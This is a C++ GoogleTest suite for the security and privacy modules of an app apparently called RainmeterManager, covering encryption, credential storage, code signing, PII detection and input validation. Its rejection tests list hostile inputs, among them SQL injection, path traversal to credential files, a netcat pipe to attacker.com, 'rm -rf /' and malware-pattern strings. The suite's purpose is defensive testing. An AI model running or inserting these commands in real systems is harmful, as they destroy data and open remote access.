#include <gtest/gtest.h>
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <wintrust.h>
#include <softpub.h>
#include <string>
#include <vector>
#include <random>
#include <memory>
#include <fstream>
#include <chrono>

#include "../../src/core/security.h"
#include "../../src/core/privacy_manager.h"
#include "../../src/core/logger.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wintrust.lib")

using namespace RainmeterManager::Core;

class SecurityTest : public ::testing::Test {
protected:
    void SetUp() override {
        ASSERT_TRUE(Security::Initialize());
        Logger::GetInstance().Log(LogLevel::Info, "SecurityTest", "Test setup completed");
    }
    
    void TearDown() override {
        Security::Cleanup();
    }
    
    // Helper to generate random data
    std::string GenerateRandomData(size_t size) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        std::string data;
        data.reserve(size);
        for (size_t i = 0; i < size; ++i) {
            data.push_back(static_cast<char>(dis(gen)));
        }
        return data;
    }
    
    // Helper to create temporary file
    std::wstring CreateTempFile(const std::string& content) {
        wchar_t tempPath[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        
        wchar_t tempFile[MAX_PATH];
        GetTempFileName(tempPath, L"SEC", 0, tempFile);
        
        std::ofstream file(tempFile, std::ios::binary);
        file.write(content.c_str(), content.size());
        file.close();
        
        return std::wstring(tempFile);
    }
};

// Cryptographic Security Tests
TEST_F(SecurityTest, AESGCMEncryptionIntegrity) {
    std::string plaintext = "This is a test message for AES-GCM encryption integrity validation.";
    std::string key = "SecretKey1234567890123456789012"; // 32 bytes for AES-256
    
    std::string encrypted = Security::EncryptAES(plaintext, key);
    EXPECT_FALSE(encrypted.empty());
    EXPECT_NE(encrypted, plaintext);
    
    // Verify decryption
    std::string decrypted = Security::DecryptAES(encrypted, key);
    EXPECT_EQ(decrypted, plaintext);
}

TEST_F(SecurityTest, AESGCMTamperDetection) {
    std::string plaintext = "Tamper detection test message";
    std::string key = "TamperTestKey123456789012345678";
    
    std::string encrypted = Security::EncryptAES(plaintext, key);
    
    // Tamper with encrypted data
    if (!encrypted.empty()) {
        encrypted[encrypted.size() / 2] ^= 0x01; // Flip one bit
        
        std::string tampered_decrypted = Security::DecryptAES(encrypted, key);
        EXPECT_TRUE(tampered_decrypted.empty()); // Should fail authentication
    }
}

TEST_F(SecurityTest, AESKeyStrengthValidation) {
    std::string plaintext = "Key strength test";
    
    // Test various key sizes
    std::vector<std::string> keys = {
        "weak",                           // Too short
        "StrongKey32BytesLong1234567890", // 32 bytes (good)
        "VeryLongKeyThatExceeds32BytesAndShouldStillWork1234567890" // Too long but should work
    };
    
    for (const auto& key : keys) {
        std::string encrypted = Security::EncryptAES(plaintext, key);
        if (!encrypted.empty()) {
            std::string decrypted = Security::DecryptAES(encrypted, key);
            EXPECT_EQ(decrypted, plaintext);
        }
    }
}

TEST_F(SecurityTest, SHA256HashConsistency) {
    std::string input = "Hash consistency test input";
    
    std::string hash1 = Security::SHA256Hash(input);
    std::string hash2 = Security::SHA256Hash(input);
    
    EXPECT_EQ(hash1, hash2);
    EXPECT_EQ(hash1.length(), 64); // SHA256 = 32 bytes = 64 hex chars
    
    // Test with different input
    std::string differentInput = input + "different";
    std::string hash3 = Security::SHA256Hash(differentInput);
    EXPECT_NE(hash1, hash3);
}

TEST_F(SecurityTest, SHA256AvalancheEffect) {
    std::string input1 = "avalanche test input";
    std::string input2 = "avalanche test inpuu"; // One bit difference
    
    std::string hash1 = Security::SHA256Hash(input1);
    std::string hash2 = Security::SHA256Hash(input2);
    
    EXPECT_NE(hash1, hash2);
    
    // Count different bits
    int differentBits = 0;
    for (size_t i = 0; i < std::min(hash1.length(), hash2.length()); ++i) {
        if (hash1[i] != hash2[i]) {
            differentBits++;
        }
    }
    
    // Should have significant difference (avalanche effect)
    EXPECT_GT(differentBits, 20); // Arbitrary threshold
}

// DPAPI Security Tests
TEST_F(SecurityTest, DPAPICredentialSecurity) {
    std::string sensitiveData = "Very sensitive credential information";
    std::string credentialKey = "TestCredentialKey";
    
    // Store credential
    EXPECT_TRUE(Security::StoreCredential(credentialKey, sensitiveData));
    
    // Retrieve credential
    std::string retrieved = Security::RetrieveCredential(credentialKey);
    EXPECT_EQ(retrieved, sensitiveData);
    
    // Delete credential
    EXPECT_TRUE(Security::DeleteCredential(credentialKey));
    
    // Verify deletion
    std::string retrievedAfterDelete = Security::RetrieveCredential(credentialKey);
    EXPECT_TRUE(retrievedAfterDelete.empty());
}

TEST_F(SecurityTest, DPAPIMultipleCredentials) {
    std::vector<std::pair<std::string, std::string>> credentials = {
        {"Cred1", "Data1"},
        {"Cred2", "Data2"},
        {"Cred3", "Data3"}
    };
    
    // Store all credentials
    for (const auto& cred : credentials) {
        EXPECT_TRUE(Security::StoreCredential(cred.first, cred.second));
    }
    
    // Verify all can be retrieved
    for (const auto& cred : credentials) {
        std::string retrieved = Security::RetrieveCredential(cred.first);
        EXPECT_EQ(retrieved, cred.second);
    }
    
    // Clean up
    for (const auto& cred : credentials) {
        EXPECT_TRUE(Security::DeleteCredential(cred.first));
    }
}

// Code Signing Verification Tests
TEST_F(SecurityTest, CodeSignatureValidation) {
    // Test with system file (should be signed)
    std::wstring systemFile = L"C:\\Windows\\System32\\kernel32.dll";
    
    bool isValid = Security::VerifyCodeSignature(systemFile);
    EXPECT_TRUE(isValid) << "System file should have valid signature";
}

TEST_F(SecurityTest, UnsignedFileDetection) {
    // Create temporary unsigned file
    std::string content = "This is an unsigned test file";
    std::wstring tempFile = CreateTempFile(content);
    
    bool isValid = Security::VerifyCodeSignature(tempFile);
    EXPECT_FALSE(isValid) << "Temporary file should not be signed";
    
    // Clean up
    DeleteFile(tempFile.c_str());
}

// Malware Detection Tests
TEST_F(SecurityTest, MalwarePatternDetection) {
    std::vector<std::pair<std::string, bool>> testCases = {
        {"Normal safe content", false},
        {"This file contains malicious code", true},
        {"eval(base64_decode($_GET['cmd']))", true},
        {"CreateRemoteThread", true},
        {"VirtualAllocEx", true},
        {"Regular application code", false}
    };
    
    for (const auto& testCase : testCases) {
        bool isMalicious = Security::ScanForMaliciousPatterns(testCase.first);
        EXPECT_EQ(isMalicious, testCase.second) 
            << "Pattern: " << testCase.first;
    }
}

TEST_F(SecurityTest, FileExtensionValidation) {
    std::vector<std::pair<std::wstring, bool>> testCases = {
        {L"document.txt", true},
        {L"image.jpg", true},
        {L"script.exe", false},
        {L"suspicious.bat", false},
        {L"data.json", true},
        {L"malware.scr", false}
    };
    
    for (const auto& testCase : testCases) {
        bool isAllowed = Security::IsFileExtensionAllowed(testCase.first);
        EXPECT_EQ(isAllowed, testCase.second) 
            << "Extension: " << std::string(testCase.first.begin(), testCase.first.end());
    }
}

// Performance Security Tests
TEST_F(SecurityTest, EncryptionPerformanceDoSResistance) {
    const int iterations = 1000;
    const size_t dataSize = 1024 * 1024; // 1MB
    
    std::string largeData = GenerateRandomData(dataSize);
    std::string key = "PerformanceTestKey1234567890123456";
    
    auto startTime = std::chrono::high_resolution_clock::now();
    
    for (int i = 0; i < iterations; ++i) {
        std::string encrypted = Security::EncryptAES(largeData, key);
        EXPECT_FALSE(encrypted.empty());
        
        // Limit test if taking too long (DoS protection)
        if (i % 100 == 0) {
            auto currentTime = std::chrono::high_resolution_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                currentTime - startTime).count();
            
            if (elapsed > 30000) { // 30 seconds max
                Logger::GetInstance().Log(LogLevel::Warning, "SecurityTest", 
                    "Encryption performance test terminated early to prevent DoS");
                break;
            }
        }
    }
    
    auto endTime = std::chrono::high_resolution_clock::now();
    auto totalTime = std::chrono::duration_cast<std::chrono::milliseconds>(
        endTime - startTime).count();
    
    Logger::GetInstance().Log(LogLevel::Info, "SecurityTest", 
        "Encryption performance: " + std::to_string(totalTime) + "ms for " + 
        std::to_string(iterations) + " iterations");
}

// Memory Security Tests
TEST_F(SecurityTest, MemoryWipeAfterUse) {
    std::string sensitiveData = "This is sensitive data that should be wiped";
    std::string key = "MemoryWipeTestKey123456789012345";
    
    // Capture memory pattern before
    std::string encrypted = Security::EncryptAES(sensitiveData, key);
    EXPECT_FALSE(encrypted.empty());
    
    // Force garbage collection and memory cleanup
    encrypted.clear();
    sensitiveData.clear();
    key.clear();
    
    // Note: Full memory wipe verification would require lower-level access
    // This test ensures the API calls complete successfully
    SUCCEED();
}

// Privilege Escalation Tests
TEST_F(SecurityTest, PrivilegeEscalationPrevention) {
    // Test that security functions don't require elevated privileges
    EXPECT_FALSE(Security::RequiresElevatedPrivileges());
    
    // Test current process token
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        
        if (GetTokenInformation(token, TokenElevation, &elevation, 
                              sizeof(elevation), &size)) {
            // Security operations should work regardless of elevation
            std::string testData = "Privilege test data";
            std::string testKey = "PrivilegeTestKey123456789012345";
            
            std::string encrypted = Security::EncryptAES(testData, testKey);
            EXPECT_FALSE(encrypted.empty());
        }
        
        CloseHandle(token);
    }
}

// Network Security Tests (if applicable)
TEST_F(SecurityTest, TLSConfigurationValidation) {
    // Test TLS settings validation
    EXPECT_TRUE(Security::ValidateTLSConfiguration());
    
    // Test minimum TLS version enforcement
    EXPECT_GE(Security::GetMinimumTLSVersion(), 0x0303); // TLS 1.2 minimum
}

// Input Validation Tests
TEST_F(SecurityTest, InputValidationAndSanitization) {
    std::vector<std::pair<std::string, bool>> testInputs = {
        {"Normal input", true},
        {"<script>alert('xss')</script>", false},
        {"'; DROP TABLE users; --", false},
        {"../../../etc/passwd", false},
        {"C:\\Windows\\System32\\cmd.exe", false},
        {"Valid file path", true}
    };
    
    for (const auto& input : testInputs) {
        bool isValid = Security::ValidateInput(input.first);
        EXPECT_EQ(isValid, input.second) 
            << "Input: " << input.first;
    }
}

// Buffer Overflow Protection Tests
TEST_F(SecurityTest, BufferOverflowProtection) {
    // Test with various buffer sizes
    std::vector<size_t> bufferSizes = {
        100, 1000, 10000, 100000, 1000000
    };
    
    for (size_t size : bufferSizes) {
        std::string testData = GenerateRandomData(size);
        std::string key = "BufferTestKey1234567890123456789";
        
        std::string encrypted = Security::EncryptAES(testData, key);
        
        if (!encrypted.empty()) {
            std::string decrypted = Security::DecryptAES(encrypted, key);
            EXPECT_EQ(decrypted.size(), testData.size()) 
                << "Buffer size: " << size;
        }
    }
}

// Concurrency Security Tests
TEST_F(SecurityTest, ConcurrentOperationSafety) {
    const int numThreads = 10;
    const int operationsPerThread = 100;
    
    std::vector<std::thread> threads;
    std::atomic<int> successCount(0);
    
    for (int t = 0; t < numThreads; ++t) {
        threads.emplace_back([&, t]() {
            for (int i = 0; i < operationsPerThread; ++i) {
                std::string data = "Thread" + std::to_string(t) + "Data" + std::to_string(i);
                std::string key = "ConcurrentKey" + std::to_string(t) + std::to_string(i);
                
                std::string encrypted = Security::EncryptAES(data, key);
                if (!encrypted.empty()) {
                    std::string decrypted = Security::DecryptAES(encrypted, key);
                    if (decrypted == data) {
                        successCount++;
                    }
                }
            }
        });
    }
    
    for (auto& thread : threads) {
        thread.join();
    }
    
    // All operations should succeed
    EXPECT_EQ(successCount.load(), numThreads * operationsPerThread);
}

// Privacy Manager Security Tests
class PrivacySecurityTest : public ::testing::Test {
protected:
    void SetUp() override {
        PrivacyManager::DestroyInstance();
        privacyManager_ = &PrivacyManager::GetInstance();
        ASSERT_TRUE(privacyManager_->Initialize());
    }
    
    void TearDown() override {
        PrivacyManager::DestroyInstance();
    }
    
    PrivacyManager* privacyManager_;
};

TEST_F(PrivacySecurityTest, PIIDataProtection) {
    // Test PII detection
    std::vector<std::string> piiData = {
        "user@domain.com",
        "123-45-6789",
        "4111-1111-1111-1111",
        "+1-555-123-4567",
        "John Doe, 123 Main St"
    };
    
    for (const auto& data : piiData) {
        EXPECT_TRUE(privacyManager_->ContainsPII(data)) 
            << "Should detect PII in: " << data;
        
        std::string sanitized = privacyManager_->SanitizeData(data);
        EXPECT_FALSE(privacyManager_->ContainsPII(sanitized)) 
            << "Sanitized data should not contain PII: " << sanitized;
    }
}

TEST_F(PrivacySecurityTest, TelemetryDataSecurity) {
    // Set strict privacy level
    privacyManager_->SetPrivacyLevel(PrivacyLevel::NONE, false);
    
    TelemetryEvent sensitiveEvent;
    sensitiveEvent.type = TelemetryType::USAGE_ANALYTICS;
    sensitiveEvent.eventData = "Sensitive user interaction data";
    
    // Should be blocked at NONE level
    EXPECT_FALSE(privacyManager_->IsEventTypeAllowed(TelemetryType::USAGE_ANALYTICS));
    
    // Only error reporting should be allowed
    EXPECT_TRUE(privacyManager_->IsEventTypeAllowed(TelemetryType::ERROR_REPORTING));
}

// Penetration Testing Simulation
TEST_F(SecurityTest, PenetrationTestingSimulation) {
    Logger::GetInstance().Log(LogLevel::Info, "SecurityTest", 
        "Starting penetration testing simulation");
    
    // Test 1: SQL Injection attempts
    std::vector<std::string> sqlInjectionAttempts = {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; SELECT * FROM passwords",
        "'; DELETE FROM config; --"
    };
    
    for (const auto& attempt : sqlInjectionAttempts) {
        EXPECT_FALSE(Security::ValidateInput(attempt)) 
            << "SQL injection should be blocked: " << attempt;
    }
    
    // Test 2: Path traversal attempts
    std::vector<std::string> pathTraversalAttempts = {
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\config\\sam",
        "/etc/shadow",
        "C:\\boot.ini"
    };
    
    for (const auto& attempt : pathTraversalAttempts) {
        EXPECT_FALSE(Security::ValidateInput(attempt)) 
            << "Path traversal should be blocked: " << attempt;
    }
    
    // Test 3: Command injection attempts
    std::vector<std::string> commandInjectionAttempts = {
        "file.txt; rm -rf /",
        "file.txt && del C:\\*",
        "file.txt | nc attacker.com 4444",
        "file.txt; shutdown -s -t 0"
    };
    
    for (const auto& attempt : commandInjectionAttempts) {
        EXPECT_FALSE(Security::ValidateInput(attempt)) 
            << "Command injection should be blocked: " << attempt;
    }
    
    Logger::GetInstance().Log(LogLevel::Info, "SecurityTest", 
        "Penetration testing simulation completed");
}

// Security Audit Logging Test
TEST_F(SecurityTest, SecurityAuditLogging) {
    Logger& logger = Logger::GetInstance();
    
    // Test security event logging
    logger.Log(LogLevel::Warning, "Security", "Suspicious activity detected");
    logger.Log(LogLevel::Error, "Security", "Security violation occurred");
    logger.Log(LogLevel::Info, "Security", "Security scan completed");
    
    // Verify logging doesn't interfere with security operations
    std::string testData = "Audit log test data";
    std::string testKey = "AuditLogTestKey1234567890123456";
    
    std::string encrypted = Security::EncryptAES(testData, testKey);
    EXPECT_FALSE(encrypted.empty());
    
    std::string decrypted = Security::DecryptAES(encrypted, testKey);
    EXPECT_EQ(decrypted, testData);
}

// Main function for security tests
int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    
    // Initialize COM for Windows APIs
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    
    // Run all security tests
    int result = RUN_ALL_TESTS();
    
    CoUninitialize();
    return result;
}
